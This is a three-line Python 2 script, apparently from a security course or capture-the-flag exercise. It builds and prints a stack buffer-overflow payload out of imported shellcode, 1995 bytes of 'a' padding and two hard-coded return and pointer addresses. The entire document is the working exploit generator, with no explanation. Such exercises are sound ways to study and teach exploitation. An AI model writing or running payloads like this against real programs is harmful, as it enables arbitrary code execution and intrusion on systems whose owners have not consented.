from shellcode import shellcode
from struct import pack
print shellcode + "a"*1995 + pack("<I", 0xbffea808) + pack("<I", 0xbffeb01c)